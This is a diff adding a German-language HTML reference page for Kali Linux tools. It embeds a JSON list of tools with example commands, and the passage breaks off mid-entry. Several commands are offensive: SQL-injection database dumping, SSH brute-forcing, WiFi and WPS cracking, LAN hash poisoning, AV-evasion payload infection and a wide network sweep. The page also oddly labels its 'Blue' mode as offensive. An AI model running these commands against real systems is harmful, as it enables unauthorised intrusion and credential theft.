+[data-mode="purple"] .cmdbuilder-flag.active{border-color:#a855f7;background:rgba(168,85,247,.05)}
+.cmdbuilder-checkbox{margin-top:2px;accent-color:var(--accent-cyan);flex-shrink:0;cursor:pointer}
+[data-mode="purple"] .cmdbuilder-checkbox{accent-color:#a855f7}
+.cmdbuilder-flag-info{flex:1;min-width:0}
+.cmdbuilder-flag-label{font-family:var(--font-mono);font-size:.72rem;font-weight:600;color:var(--text-primary)}
+.cmdbuilder-flag-desc{font-size:.65rem;color:var(--text-muted);margin-top:2px;line-height:1.3}
+.cmdbuilder-output{background:var(--bg-void);border:1px solid var(--accent-cyan);border-radius:8px;padding:12px 16px;font-family:var(--font-mono);font-size:.82rem;color:var(--accent-green);position:relative;margin-bottom:8px;word-break:break-all;min-height:1.2em;padding-right:90px}
+[data-mode="purple"] .cmdbuilder-output{border-color:#a855f7}
+.cmdbuilder-copy{position:absolute;top:8px;right:8px;background:var(--bg-elevated);border:1px solid var(--border);border-radius:6px;padding:4px 10px;font-size:.68rem;color:var(--text-muted);cursor:pointer;font-family:var(--font-mono)}
+.cmdbuilder-copy:hover{color:var(--accent-cyan);border-color:var(--accent-cyan)}
+[data-mode="purple"] .cmdbuilder-copy:hover{color:#c084fc;border-color:#a855f7}
+.cmdbuilder-hint{font-size:.68rem;color:var(--text-muted);font-style:italic}
+
+/* ═══ THEMES ═══ */
+.theme-toggle{position:absolute;top:48px;right:24px;display:flex;gap:6px;z-index:5}
+.theme-btn{width:24px;height:24px;border-radius:50%;border:2px solid var(--border);cursor:pointer;transition:transform .15s,border-color .15s}
+.theme-btn:hover{transform:scale(1.15)}
+.theme-btn.active{border-color:var(--text-primary);transform:scale(1.1)}
+.theme-btn[data-theme="dark"]{background:linear-gradient(135deg,#050507,#22d3ee)}
+.theme-btn[data-theme="cyber"]{background:linear-gradient(135deg,#0a0a10,#f87171)}
+.theme-btn[data-theme="light"]{background:linear-gradient(135deg,#f4f4f5,#71717a)}
+
+/* ═══ MODE SWITCH ═══ */
+.mode-switch{display:flex;gap:0;border-radius:100px;overflow:hidden;border:1px solid var(--border-strong);background:var(--bg-elevated)}
+.mode-btn{padding:8px 20px;font-family:var(--font-mono);font-size:.78rem;font-weight:600;border:none;background:transparent;color:var(--text-muted);cursor:pointer;transition:all .25s;display:flex;align-items:center;gap:6px}
+.mode-btn:hover{color:var(--text-primary)}
+.mode-btn.active.blue{background:rgba(59,130,246,.15);color:#60a5fa}
+.mode-btn.active.purple{background:rgba(168,85,247,.15);color:#c084fc}
+.mode-badge{display:inline-block;padding:4px 12px;border-radius:100px;font-family:var(--font-mono);font-size:.7rem;font-weight:600;letter-spacing:.05em}
+.mode-badge.blue{background:rgba(59,130,246,.12);color:#60a5fa;border:1px solid rgba(59,130,246,.3)}
+.mode-badge.purple{background:rgba(168,85,247,.12);color:#c084fc;border:1px solid rgba(168,85,247,.3)}
+/* Violet filter when purple mode active */
+[data-mode="purple"] .app-header{background:linear-gradient(180deg,rgba(20,10,35,.95),transparent)}
+[data-mode="purple"] .reading-progress{background:var(--accent-purple,#a855f7)}
+[data-mode="purple"] .filter-search:focus{border-color:#a855f7}
+[data-mode="purple"] .filter-btn.active{border-color:#a855f7;color:#c084fc}
+[data-mode="purple"] .tool-name::before{color:#c084fc}
+[data-mode="purple"] .tool-cmd{color:#d8b4fe}
+[data-mode="purple"] .recipe-name{color:#c084fc}
+.wizard-btn{padding:8px 14px;background:var(--bg-elevated);color:var(--accent-cyan);border:1px solid rgba(34,211,238,.4);border-radius:8px;font:600 .78rem var(--font-mono);cursor:pointer}
+.wizard-btn:hover{background:rgba(34,211,238,.1);border-color:var(--accent-cyan)}
+[data-mode="purple"] .wizard-btn{border-color:#a855f7;color:#c084fc}
+[data-mode="purple"] .tool-card[data-category]::after{content:'';position:absolute;inset:0;pointer-events:none;background:radial-gradient(ellipse at top right,rgba(168,85,247,.04),transparent 60%);z-index:0}
+/* Blue Schimmer */
+[data-mode="blue"] .tool-card[data-category]::after{content:'';position:absolute;inset:0;pointer-events:none;background:radial-gradient(ellipse at top right,rgba(59,130,246,.035),transparent 60%);z-index:0}
+[data-mode="blue"] .app-header{background:linear-gradient(180deg,rgba(8,12,24,.95),transparent)}
+[data-mode="blue"] .reading-progress{background:var(--accent-cyan,#22d3ee)}
+/* Mode-Switch: globaler Mini-Fade übernimmt den Übergang (siehe top of CSS) */
+.tool-card{animation:cardFadeIn .3s ease-out}
+@keyframes cardFadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+[data-mode="purple"] .mode-btn.active.purple{box-shadow:0 0 15px rgba(168,85,247,.3)}
+[data-mode="purple"] .kbd-hint{border-color:rgba(168,85,247,.2)}
+[data-mode="purple"] .kbd-hint kbd{color:#c084fc}
+
+/* Cyber theme override */
+[data-theme="cyber"]{--accent-cyan:#f87171;--accent-green:#fbbf24;--tape-1:#fbbf24;--tape-3:#f87171;--tape-4:#fb923c;--tape-5:#ef4444}
+[data-theme="light"]{--bg-void:#f4f4f5;--bg-base:#ffffff;--bg-surface:#fafafa;--bg-elevated:#f0f0f0;--text-primary:#18181b;--text-secondary:#52525b;--text-muted:#71717a;--text-dim:#a1a1aa;--border:rgba(0,0,0,.08);--border-strong:rgba(0,0,0,.16);--accent-cyan:#0891b2;--accent-green:#059669;--accent-amber:#d97706;--accent-red:#dc2626}
+
+/* ═══ REDUCED MOTION ═══ */
+@media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.001s!important;transition-duration:.001s!important}.tool-card:hover{transform:none}.reading-progress{transition:none}}
+
+@media(hover:none),(pointer:coarse){.fav-btn,.compare-btn,.tool-cmd-copy{opacity:.8!important}.tool-card:hover .fav-btn,.tool-card:hover .compare-btn,.tool-card:hover .tool-cmd-copy{opacity:.8!important}}
+
+/* ═══ PRINT ═══ */
+@media print{
+  .filter-bar,.compare-bar,.kbd-hint,.reading-progress,.theme-toggle,.fav-btn,.compare-btn,.tool-audio,.tool-cmd-copy,.playbooks-section,.wizard-btn{display:none!important}
+  body{background:#fff;color:#000}
+  .tool-card{border:1px solid #ccc;box-shadow:none;break-inside:avoid;page-break-inside:avoid}
+  .tool-card[data-category]{border-top:3px solid #999!important}
+  .tool-name{color:#000}
+  .tool-cmd{background:#f5f5f5;color:#333;border:1px solid #ddd}
+  .tool-desc,.tool-tag{color:#333}
+  .app-header{border-bottom:2px solid #000}
+}
+  </style>
+</head>
+<body>
+  <noscript style="display:block;padding:16px 24px;background:#f87171;color:#fff;font-family:sans-serif;text-align:center">⚠ Diese Seite benötigt JavaScript für Suche, Filter und Interaktivität.</noscript>
+  <a href="#main" class="skip-link">Zum Inhalt springen</a>
+  <div class="reading-progress" id="reading-progress"></div>
+  <header class="app-header">
+    <div class="header-inner">
+      <div class="theme-toggle" id="theme-toggle">
+        <button class="theme-btn active" data-theme="dark" aria-label="Dark Theme" title="Dark"></button>
+        <button class="theme-btn" data-theme="cyber" aria-label="Cyber Theme" title="Cyber"></button>
+        <button class="theme-btn" data-theme="light" aria-label="Light Theme" title="Light"></button>
+      </div>
+      <div>
+        <div class="terminal-prefix">forensic.tool_db.ready</div>
+        <h1>Kali <span class="accent">Forensik Explorer</span></h1>
+        <p class="subtitle">144 Tools, Blue &amp; Purple. Tippe einen Namen, krieg die Card.</p>
+      </div>
+      <div style="display:flex;flex-direction:column;align-items:flex-end;gap:10px">
+        <div class="mode-switch" id="mode-switch">
+          <button class="mode-btn active blue" data-mode="blue">🔵 Blue</button>
+          <button class="mode-btn purple" data-mode="purple">🟣 Purple</button>
+        </div>
+        <div class="header-stats" id="header-stats"></div>
+      </div>
+    </div>
+  </header>
+
+  <nav class="filter-bar" id="filter-bar">
+    <div class="search-wrap" style="position:relative;flex:1;min-width:200px">
+      <input type="search" class="filter-search" id="search" placeholder="🔍 Tool suchen…" aria-label="Tool suchen" style="width:100%;padding-right:38px">
+      <button id="search-clear" type="button" aria-label="Suche leeren" style="position:absolute;right:8px;top:50%;transform:translateY(-50%);background:none;border:none;color:var(--text-muted);font-size:1.1rem;cursor:pointer;display:none">×</button>
+    </div>
+    <div id="results-summary" class="results-summary" style="font-family:var(--font-mono);font-size:.72rem;color:var(--text-secondary);white-space:nowrap"></div>
+    <div class="filter-chips" id="filter-chips"></div>
+  </nav>
+
+  <main id="main" class="container">
+    <!-- Quick-Start Playbooks -->
+    <div class="playbooks-section">
+      <div class="playbooks-header">
+        <h2>🚀 Quick-Start Playbooks</h2>
+        <button class="wizard-btn" id="wizard-open">🧭 Guided Wizard</button>
+        <button class="wizard-btn" id="prompt-open">🤖 Prompt Builder</button>
+      </div>
+      <div class="playbooks-grid" id="playbooks-grid"></div>
+    </div>
+
+    <!-- Learning Paths -->
+    <div class="paths-section">
+      <div class="paths-header">
+        <h2>🛤️ Lernpfade</h2>
+      </div>
+      <div class="paths-grid" id="paths-grid"></div>
+    </div>
+
+    <!-- Tool Grid -->
+    <div class="tools-grid" id="tool-grid"></div>
+    <div class="no-results" id="no-results" style="display:none">
+      <p>Kein Tool gefunden. Versuche einen anderen Suchbegriff.</p>
+    </div>
+  </main>
+
+  <!-- Compare Bar -->
+  <div class="compare-bar" id="compare-bar">
+    <span class="compare-bar-label">⚖ Vergleich:</span>
+    <div class="compare-items" id="compare-items" style="display:flex;gap:8px;flex-wrap:wrap"></div>
+    <div class="compare-action">
+      <button class="compare-btn-clear" id="compare-clear" aria-label="Vergleich leeren">Leeren</button>
+      <button class="compare-btn-go" id="compare-go" aria-label="Vergleich öffnen">Vergleichen</button>
+    </div>
+  </div>
+  <!-- Compare Modal -->
+  <div class="compare-modal-overlay" id="compare-overlay">
+    <div class="compare-modal">
+      <button class="compare-modal-close" id="compare-close" aria-label="Schließen">×</button>
+      <h2>Tool-Vergleich</h2>
+      <div id="compare-table-wrapper"></div>
+    </div>
+  </div>
+
+  <!-- Wizard Modal -->
+  <div class="wizard-overlay" id="wizard-overlay">
+    <div class="wizard-modal">
+      <button class="wizard-close" id="wizard-close" aria-label="Schließen">×</button>
+      <div id="wizard-content"></div>
+    </div>
+  </div>
+
+  <!-- Keyboard Hint -->
+  <div class="kbd-hint" id="kbd-hint" role="button" tabindex="0" aria-label="Tastatur-Shortcuts anzeigen" title="Tastatur-Shortcuts"><kbd>?</kbd> Shortcuts</div>
+  <!-- Cheat Sheet Modal -->
+  <div class="cheat-overlay" id="cheat-overlay">
+    <div class="cheat-modal">
+      <button class="cheat-close" id="cheat-close" aria-label="Schließen">×</button>
+      <h2>⌨️ Tastatur-Shortcuts</h2>
+      <ul class="cheat-list">
+        <li><span>Suche fokussieren</span><kbd>Ctrl+K</kbd></li>
+        <li><span>Phase 1-6 filtern</span><kbd>1</kbd> – <kbd>6</kbd></li>
+        <li><span>Alle Tools zeigen</span><kbd>0</kbd></li>
+        <li><span>Favoriten-Filter</span><kbd>F</kbd></li>
+        <li><span>Vergleich öffnen</span><kbd>C</kbd></li>
+        <li><span>Diese Hilfe</span><kbd>?</kbd></li>
+        <li><span>Modals schließen</span><kbd>Esc</kbd></li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Tool Detail Modal -->
+  <div class="detail-overlay" id="detail-overlay">
+    <div class="detail-modal" id="detail-modal"></div>
+  </div>
+
+  <!-- LLM Prompt Builder -->
+  <div class="prompt-overlay" id="prompt-overlay">
+    <div class="prompt-modal" id="prompt-modal-content"></div>
+  </div>
+
+  <footer class="app-footer">
+    <span>Generated by Yuno · Kali Linux 2026.2 · <a href="#" onclick="window.print();return false" style="color:var(--accent-cyan);text-decoration:none">📋 Drucken / PDF</a></span>
+  </footer>
+
+  <script type="application/json" id="tool-db">
+{
+  "meta": {
+    "kaliVersion": "2026.2",
+    "generatedDate": "2026-08-06",
+    "version": "2.0"
+  },
+  "modes": {
+    "blue": {
+      "label": "Blue Team — Offensive",
+      "icon": "🔵",
+      "shortLabel": "Blue",
+      "categories": [
+        {
+          "id": "info-gathering",
+          "name": "Information Gathering",
+          "icon": "📡",
+          "tools": [
+            {
+              "id": "nmap",
+              "name": "nmap",
+              "desc": "Der Netzwerk-Scanner Nr. 1. Port-Scan, Service-Erkennung, OS-Fingerprinting.",
+              "cmd": "nmap -sV -sC -A target.com",
+              "tags": [
+                "Network",
+                "Scanner",
+                "Recon"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "masscan",
+              "name": "masscan",
+              "desc": "Massiver Port-Scanner — scannt das gesamte Internet in Minuten.",
+              "cmd": "masscan -p1-65535 10.0.0.0/8 --rate=10000",
+              "tags": [
+                "Network",
+                "Scanner",
+                "Fast"
+              ],
+              "pop": "classic"
+            },
+            {
+              "id": "recon-ng",
+              "name": "recon-ng",
+              "desc": "OSINT-Framework mit modularem Aufbau. Recon-Workflows automatisieren.",
+              "cmd": "recon-ng -w target_corp",
+              "tags": [
+                "OSINT",
+                "Framework",
+                "Recon"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "maltego",
+              "name": "maltego",
+              "desc": "Graphische OSINT-Plattform für Link-Analyse und Footprinting.",
+              "cmd": "maltego",
+              "tags": [
+                "OSINT",
+                "Graph",
+                "Visual"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "spiderfoot",
+              "name": "spiderfoot",
+              "desc": "Automatisches OSINT-Tool — sammelt 200+ Datenquellen über ein Ziel.",
+              "cmd": "spiderfoot -s target.com",
+              "tags": [
+                "OSINT",
+                "Automation"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "amass",
+              "name": "amass",
+              "desc": "Subdomain-Enumeration und externer Asset-Discovery.",
+              "cmd": "amass enum -d target.com",
+              "tags": [
+                "Recon",
+                "Subdomain",
+                "OSINT"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "theHarvester",
+              "name": "theHarvester",
+              "desc": "Sammelt E-Mails, Subdomains, Hosts aus öffentlichen Quellen.",
+              "cmd": "theHarvester -d target.com -b all",
+              "tags": [
+                "OSINT",
+                "Email",
+                "Recon"
+              ],
+              "pop": "classic"
+            },
+            {
+              "id": "wireshark",
+              "name": "wireshark",
+              "desc": "Der Standard-Netzwerk-Protokoll-Analyzer. Live-Capture + Deep-Dive in Pakete.",
+              "cmd": "wireshark -i eth0 -k",
+              "tags": [
+                "Network",
+                "Sniffer",
+                "GUI"
+              ],
+              "pop": "daily"
+            }
+          ]
+        },
+        {
+          "id": "vulnerability-analysis",
+          "name": "Vulnerability Analysis",
+          "icon": "🛡️",
+          "tools": [
+            {
+              "id": "nikto",
+              "name": "nikto",
+              "desc": "Webserver-Schwachstellen-Scanner. Prüft 6700+ bekannte Risiken.",
+              "cmd": "nikto -h https://target.com",
+              "tags": [
+                "Web",
+                "Scanner",
+                "CGI"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "gvm",
+              "name": "gvm (Greenbone)",
+              "desc": "Open-Source Vulnerability Management — ehemals OpenVAS. Industrie-Standard-Scanner.",
+              "cmd": "gvm-start && gvm-cli -h",
+              "tags": [
+                "Vuln-Scan",
+                "Compliance",
+                "Gold"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "nmap-vulners",
+              "name": "nmap-vulners",
+              "desc": "NSE-Script für nmap — matcht Services gegen CVE-Datenbank.",
+              "cmd": "nmap --script vulners -sV target.com",
+              "tags": [
+                "NSE",
+                "CVE",
+                "Scanner"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "legion",
+              "name": "legion",
+              "desc": "GUI-Vulnerability-Scanner mit Auto-Pentest-Modulen.",
+              "cmd": "legion",
+              "tags": [
+                "GUI",
+                "Vuln-Scan"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "unix-privesc-check",
+              "name": "unix-privesc-check",
+              "desc": "Prüft Linux/BSD auf lokale Privilege-Escalation-Pfade.",
+              "cmd": "unix-privesc-check standard",
+              "tags": [
+                "Privesc",
+                "Linux",
+                "Audit"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "lynis",
+              "name": "lynis",
+              "desc": "System-Audit-Tool für Härtung und Compliance auf Unix.",
+              "cmd": "lynis audit system",
+              "tags": [
+                "Audit",
+                "Hardening",
+                "Linux"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "davtest",
+              "name": "davtest",
+              "desc": "Testet WebDAV-Endpoints auf PUT/MOVE-Fähigkeiten.",
+              "cmd": "davtest -url http://target/dav",
+              "tags": [
+                "WebDAV",
+                "Recon"
+              ],
+              "pop": "classic"
+            }
+          ]
+        },
+        {
+          "id": "web-app-analysis",
+          "name": "Web Application Analysis",
+          "icon": "🌐",
+          "tools": [
+            {
+              "id": "burpsuite",
+              "name": "Burp Suite",
+              "desc": "Die Web-Hacking-Suite. Proxy + Repeater + Intruder + Scanner.",
+              "cmd": "burpsuite",
+              "tags": [
+                "Web",
+                "Proxy",
+                "Gold"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "sqlmap",
+              "name": "sqlmap",
+              "desc": "Automatisierte SQL-Injection-Erkennung und -Exploitation.",
+              "cmd": "sqlmap -u 'http://target/?id=1' --dbs",
+              "tags": [
+                "SQLi",
+                "Web",
+                "Exploit"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "zap",
+              "name": "OWASP ZAP",
+              "desc": "OWASP-Zed-Attack-Proxy. Open-Source-Alternative zu Burp.",
+              "cmd": "zaproxy",
+              "tags": [
+                "Web",
+                "Proxy",
+                "Scanner"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "wpscan",
+              "name": "wpscan",
+              "desc": "WordPress-Sicherheits-Scanner. Plugin/Theme/User-Enumeration.",
+              "cmd": "wpscan --url https://target.com --enumerate u,p,t",
+              "tags": [
+                "CMS",
+                "WordPress"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "dirb",
+              "name": "dirb",
+              "desc": "Bruteforce-Web-Content-Scanner. Findet versteckte Pfade.",
+              "cmd": "dirb https://target.com /usr/share/wordlists/dirb/common.txt",
+              "tags": [
+                "Web",
+                "Discovery"
+              ],
+              "pop": "classic"
+            },
+            {
+              "id": "gobuster",
+              "name": "gobuster",
+              "desc": "Schneller Directory/Subdomain-Buster (Go-Implementierung).",
+              "cmd": "gobuster dir -u https://target.com -w wordlist.txt",
+              "tags": [
+                "Web",
+                "Fuzz",
+                "Fast"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "ffuf",
+              "name": "ffuf",
+              "desc": "Ultraschneller Web-Fuzzer. Multithreaded, viele Protokolle.",
+              "cmd": "ffuf -u https://target.com/FUZZ -w wordlist.txt",
+              "tags": [
+                "Fuzz",
+                "Web",
+                "Fast"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "nuclei",
+              "name": "nuclei",
+              "desc": "Template-basierter Vulnerability-Scanner. 6000+ Templates für CVEs.",
+              "cmd": "nuclei -u https://target.com -t cves/",
+              "tags": [
+                "Scanner",
+                "CVE",
+                "Templates"
+              ],
+              "pop": "gold"
+            }
+          ]
+        },
+        {
+          "id": "database-assessment",
+          "name": "Database Assessment",
+          "icon": "🗄️",
+          "tools": [
+            {
+              "id": "sqlmap",
+              "name": "sqlmap",
+              "desc": "SQLi-König — Datenbank-Extraktion und Schema-Dump.",
+              "cmd": "sqlmap -u 'http://target/?id=1' --dump-all",
+              "tags": [
+                "SQLi",
+                "DB",
+                "Exploit"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "sqlninja",
+              "name": "sqlninja",
+              "desc": "Spezialisiert auf MS-SQL-Server-Exploitation über SQLi.",
+              "cmd": "sqlninja -m target",
+              "tags": [
+                "MSSQL",
+                "SQLi"
+              ],
+              "pop": "classic"
+            },
+            {
+              "id": "oscanner",
+              "name": "oscanner",
+              "desc": "Oracle-Datenbank-Schwachstellen-Scanner.",
+              "cmd": "oscanner -s 10.10.10.5 -P 1521",
+              "tags": [
+                "Oracle",
+                "Scanner"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "sidguess",
+              "name": "sidguess",
+              "desc": "Bruteforce-Oracle-SIDs und -Service-Names.",
+              "cmd": "sidguess -s 10.10.10.5 -p 1521",
+              "tags": [
+                "Oracle",
+                "Recon"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "tnscmd10g",
+              "name": "tnscmd10g",
+              "desc": "Oracle-TNS-Listener-Befehle senden.",
+              "cmd": "tnscmd10g status -h 10.10.10.5",
+              "tags": [
+                "Oracle",
+                "Recon"
+              ],
+              "pop": "classic"
+            },
+            {
+              "id": "impacket-mssqlclient",
+              "name": "impacket-mssqlclient",
+              "desc": "MSSQL-Client mit NTLM-Relay- und Command-Execution.",
+              "cmd": "mssqlclient.py domain/user:pass@10.10.10.5",
+              "tags": [
+                "MSSQL",
+                "Impacket"
+              ],
+              "pop": "standard"
+            }
+          ]
+        },
+        {
+          "id": "password-attacks",
+          "name": "Password Attacks",
+          "icon": "🔑",
+          "tools": [
+            {
+              "id": "hashcat",
+              "name": "hashcat",
+              "desc": "GPU-gestützter Passwort-Cracker. Brute-Force + Dictionary + Rules.",
+              "cmd": "hashcat -m 0 hash.txt rockyou.txt",
+              "tags": [
+                "Cracking",
+                "GPU",
+                "Gold"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "john",
+              "name": "John the Ripper",
+              "desc": "Klassischer Passwort-Cracker. Viele Hash-Formate.",
+              "cmd": "john --wordlist=rockyou.txt hashes.txt",
+              "tags": [
+                "Cracking",
+                "Hash",
+                "Classic"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "hydra",
+              "name": "hydra",
+              "desc": "Parallelisierter Login-Knacker für SSH/FTP/HTTP/MySQL/SMB.",
+              "cmd": "hydra -l admin -P rockyou.txt ssh://10.10.10.5",
+              "tags": [
+                "Bruteforce",
+                "Online"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "medusa",
+              "name": "medusa",
+              "desc": "Schneller paralleler Login-Bruteforcer (Hydra-Alternative).",
+              "cmd": "medusa -h 10.10.10.5 -u admin -P rockyou.txt -M ssh",
+              "tags": [
+                "Bruteforce",
+                "Online"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "crunch",
+              "name": "crunch",
+              "desc": "Generiert Passwort-Wortlisten nach benutzerdefinierten Mustern.",
+              "cmd": "crunch 8 10 -o wordlist.txt",
+              "tags": [
+                "Wordlist",
+                "Generator"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "cewl",
+              "name": "cewl",
+              "desc": "Custom Word List generator — scrapt Websites für zielgerichtete Wortlisten.",
+              "cmd": "cewl -d 3 -w custom.txt https://target.com",
+              "tags": [
+                "Wordlist",
+                "OSINT"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "patator",
+              "name": "patator",
+              "desc": "Modularer Brute-Forcer mit smarter Retry-Logik.",
+              "cmd": "patator ssh_login host=10.10.10.5 user=admin password=FILE0",
+              "tags": [
+                "Bruteforce",
+                "Modular"
+              ],
+              "pop": "standard"
+            }
+          ]
+        },
+        {
+          "id": "wireless-attacks",
+          "name": "Wireless Attacks",
+          "icon": "📶",
+          "tools": [
+            {
+              "id": "aircrack-ng",
+              "name": "aircrack-ng",
+              "desc": "Die WiFi-Hacking-Suite: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng.",
+              "cmd": "aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF cap.pcap",
+              "tags": [
+                "WiFi",
+                "Cracking",
+                "Gold"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "wifite",
+              "name": "wifite",
+              "desc": "Automatisierter WiFi-Audit-Runner. Ein-Knopf-WPA-Crack.",
+              "cmd": "wifite --kill --wpa",
+              "tags": [
+                "WiFi",
+                "Automation"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "reaver",
+              "name": "reaver",
+              "desc": "WPS-PIN-Brute-Force-Angriff gegen Router.",
+              "cmd": "reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv",
+              "tags": [
+                "WPS",
+                "Bruteforce"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "kismet",
+              "name": "kismet",
+              "desc": "Wireless-Network-Detector + Sniffer + IDS.",
+              "cmd": "kismet",
+              "tags": [
+                "WiFi",
+                "Sniffer",
+                "Detection"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "fern-wifi-cracker",
+              "name": "fern-wifi-cracker",
+              "desc": "GUI-WPA-Cracker für Einsteiger.",
+              "cmd": "fern-wifi-cracker",
+              "tags": [
+                "WiFi",
+                "GUI"
+              ],
+              "pop": "classic"
+            },
+            {
+              "id": "bully",
+              "name": "bully",
+              "desc": "WPS-Brute-Force (reaver-Alternative, schneller und stabiler).",
+              "cmd": "bully wlan0 -b AA:BB:CC:DD:EE:FF",
+              "tags": [
+                "WPS",
+                "Bruteforce"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "cowpatty",
+              "name": "cowpatty",
+              "desc": "WPA-PSK-Cracker mit PMK-Tabellen.",
+              "cmd": "cowpatty -r cap.pcap -s SSID -f wordlist.txt",
+              "tags": [
+                "WiFi",
+                "WPA"
+              ],
+              "pop": "classic"
+            }
+          ]
+        },
+        {
+          "id": "reverse-engineering",
+          "name": "Reverse Engineering",
+          "icon": "🔬",
+          "tools": [
+            {
+              "id": "ghidra",
+              "name": "Ghidra",
+              "desc": "NSA-Disassembler/Decompiler. Mächtige RE-Plattform.",
+              "cmd": "ghidra",
+              "tags": [
+                "Disasm",
+                "Decompiler",
+                "Gold"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "radare2",
+              "name": "radare2",
+              "desc": "CLI-Disassembler-Framework mit riesigem Toolset.",
+              "cmd": "r2 -A binary.elf",
+              "tags": [
+                "Disasm",
+                "CLI",
+                "Framework"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "gdb",
+              "name": "gdb",
+              "desc": "GNU-Debugger — Standard für Runtime-Analyse.",
+              "cmd": "gdb ./binary -ex 'break main' -ex run",
+              "tags": [
+                "Debugger",
+                "Analysis"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "objdump",
+              "name": "objdump",
+              "desc": "Binutils-Disassembler — schnelles Static-Disassembly.",
+              "cmd": "objdump -d -M intel binary",
+              "tags": [
+                "Disasm",
+                "Static"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "strings",
+              "name": "strings",
+              "desc": "Extrahiert lesbare Strings aus Binaries.",
+              "cmd": "strings -a -n 8 binary",
+              "tags": [
+                "Strings",
+                "Static"
+              ],
+              "pop": "classic"
+            },
+            {
+              "id": "ltrace",
+              "name": "ltrace",
+              "desc": "Trace-Bibliotheks-Aufrufe zur Laufzeit.",
+              "cmd": "ltrace ./binary",
+              "tags": [
+                "Trace",
+                "Dynamic"
+              ],
+              "pop": "classic"
+            },
+            {
+              "id": "strace",
+              "name": "strace",
+              "desc": "Trace-System-Calls zur Laufzeit.",
+              "cmd": "strace -f -e trace=network ./binary",
+              "tags": [
+                "Trace",
+                "Dynamic"
+              ],
+              "pop": "classic"
+            },
+            {
+              "id": "rizin",
+              "name": "rizin",
+              "desc": "Modernes radare2-Fork. Schneller, ergonomischer.",
+              "cmd": "rizin binary",
+              "tags": [
+                "Disasm",
+                "RE"
+              ],
+              "pop": "standard"
+            }
+          ]
+        },
+        {
+          "id": "exploitation",
+          "name": "Exploitation Tools",
+          "icon": "💥",
+          "tools": [
+            {
+              "id": "metasploit",
+              "name": "Metasploit Framework",
+              "desc": "Das Exploit-Framework. 2000+ Exploits, Payloads, Module.",
+              "cmd": "msfconsole -q -x 'use exploit/multi/handler'",
+              "tags": [
+                "Exploit",
+                "Framework",
+                "Gold"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "searchsploit",
+              "name": "searchsploit",
+              "desc": "Offline-Suche im Exploit-DB. Schnell, lokal.",
+              "cmd": "searchsploit apache 2.4",
+              "tags": [
+                "Exploit-DB",
+                "Search"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "exploitdb",
+              "name": "Exploit-DB",
+              "desc": "Datenbank verifizierter Exploits und Proof-of-Concepts.",
+              "cmd": "searchsploit -t vsftpd",
+              "tags": [
+                "Exploit-DB",
+                "Database"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "set",
+              "name": "SET (Social-Engineer Toolkit)",
+              "desc": "Phishing + Social-Engineering-Framework.",
+              "cmd": "setoolkit",
+              "tags": [
+                "Phishing",
+                "Social-Eng"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "commix",
+              "name": "commix",
+              "desc": "Automatisierte Command-Injection-Erkennung und -Exploitation.",
+              "cmd": "commix --url 'http://target/?cmd=INJECT'",
+              "tags": [
+                "Cmd-Inj",
+                "Web"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "shellter",
+              "name": "shellter",
+              "desc": "Dynamischer PE-Infector — bypassed AV bei Custom-Payloads.",
+              "cmd": "shellter",
+              "tags": [
+                "AV-Evasion",
+                "Payload"
+              ],
+              "pop": "classic"
+            }
+          ]
+        },
+        {
+          "id": "sniffing-spoofing",
+          "name": "Sniffing & Spoofing",
+          "icon": "🎭",
+          "tools": [
+            {
+              "id": "wireshark",
+              "name": "wireshark",
+              "desc": "Industrie-Standard-Packet-Analyzer. GUI + Filter + Dissectors.",
+              "cmd": "wireshark -i eth0 -f 'tcp port 80'",
+              "tags": [
+                "Sniffer",
+                "GUI",
+                "Gold"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "responder",
+              "name": "responder",
+              "desc": "LLMNR/NBT-NS/MDNS-Poisoner. Fängt NTLM-Hashes im LAN.",
+              "cmd": "responder -I eth0 -wrf",
+              "tags": [
+                "LLMNR",
+                "NTLM",
+                "LAN"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "mitmproxy",
+              "name": "mitmproxy",
